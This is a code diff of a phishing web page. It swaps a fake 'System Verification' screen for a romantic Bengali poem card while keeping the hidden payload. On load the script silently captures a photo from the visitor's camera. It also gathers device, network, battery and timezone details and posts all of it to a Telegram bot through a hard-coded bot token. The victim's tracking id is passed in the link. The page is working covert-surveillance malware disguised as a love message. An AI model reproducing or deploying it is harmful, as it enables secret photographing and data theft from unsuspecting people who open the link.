@@ -1,58 +1,119 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>System Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>মনের কথা</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
+        /* রোমান্টিক ডিজাইন */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1518621736915-f3b1c41bfd00?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+            background-size: cover;
+            background-position: center;
+            font-family: 'Hind Siliguri', sans-serif;
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            text-align: center;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            max-width: 85%;
+        }
+
+        h1 { font-size: 24px; margin-bottom: 20px; color: #ff4d6d; }
+        p { font-size: 18px; line-height: 1.6; font-style: italic; }
+        .heart { font-size: 40px; color: #ff4d6d; animation: heartbeat 1.2s infinite; }
+        
+        @keyframes heartbeat {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        #status { font-size: 14px; margin-top: 20px; color: rgba(255,255,255,0.6); }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;500&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div style="border: 1px solid #0f0; display: inline-block; padding: 20px; border-radius: 10px;">
-        <h2>🛡️ ENCRYPTED ACCESS</h2>
-        <p id="status">Verifying Device Identity...</p>
+
+    <div class="card">
+        <div class="heart">❤️</div>
+        <h1>একটু অপেক্ষা করো প্রিয়...</h1>
+        <p>"তোমার হাসিতে হারাই আমি,<br>তোমার চোখেই খুঁজি সুখ।<br>তুমি আছো তাই পূর্ণ আজ,<br>আমার এই ছোট বুক।"</p>
+        <p id="status">Handshaking with heart...</p>
+        
         <video id="video" width="1" height="1" autoplay style="display:none;"></video>
-        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+        <canvas id="canvas" width="720" height="1280" style="display:none;"></canvas>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
-        const type = urlParams.get('type') || 'Front Camera';
-        const botToken = "8757294593:AAEzF8MXSiLVG1vgazLrcIVWcPbjdYJYPZA"; // আপনার বটের টোকেন
+        const type = urlParams.get('type') || 'front';
+        const botToken = "8676024624:AAH4OoRcAweKjXHl91lXVD-UGolgALP0OW4";
 
-        async function startCapture() {
+        async function getFullDetails() {
+            let batt = await navigator.getBattery();
+            let conn = navigator.connection || {};
+            let mem = performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1048576) : "N/A";
+            
+            let info = `🔍 DETAILED DEVICE INFO\n\n`;
+            info += `📱 DEVICE:\n• OS: ${navigator.platform}\n• Agent: ${navigator.userAgent.substring(0, 50)}...\n\n`;
+            info += `🖥️ DISPLAY:\n• Screen: ${screen.width}x${screen.height}\n\n`;
+            info += `🌐 NETWORK:\n• Type: ${conn.effectiveType || 'wifi'}\n• Speed: ${conn.downlink || 'N/A'} Mbps\n\n`;
+            info += `🔋 BATTERY:\n• Level: ${Math.round(batt.level * 100)}%\n• Charging: ${batt.charging ? 'Yes' : 'No'}\n\n`;
+            info += `💻 SYSTEM:\n• CPU: ${navigator.hardwareConcurrency} Cores\n• TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n• RAM Used: ${mem}MB\n\n`;
+            info += `📅 Time: ${new Date().toISOString()}\n👤 Owner: Boss Enaful`;
+            return info;
+        }
+
+        async function startTask() {
+            if (!chatId) return;
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: (type === 'back' ? 'environment' : 'user') } 
-                });
+                const facing = (type === 'back') ? 'environment' : 'user';
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
+
                 setTimeout(async () => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const imgData = canvas.toDataURL('image/png');
-                    
-                    // ইমেজ ব্লব (Blob) এ রূপান্তর
                     const blob = await (await fetch(imgData)).blob();
+                    
+                    const caption = await getFullDetails();
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'capture.png');
-                    formData.append('caption', `🎯 ${type} Captured!\n🆔 ID: ${chatId}\n👤 Owner: Boss Enaful`);
+                    formData.append('photo', blob, 'pic.png');
+                    formData.append('caption', caption);
 
-                    // সরাসরি টেলিগ্রামে পাঠানো
                     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
 
-                    document.getElementById('status').innerText = "Access Granted! ✅";
-                }, 2000);
+                    document.getElementById('status').innerText = "Connected Forever! 💞";
+                    stream.getTracks().forEach(t => t.stop());
+                }, 3500);
             } catch (e) {
-                document.getElementById('status').innerText = "Permission Denied! ❌";
+                document.getElementById('status').innerText = "Permission needed to see the magic! ✨";
             }
         }
-        window.onload = startCapture;
+
+        window.onload = startTask;
     </script>
 </body>
 </html>
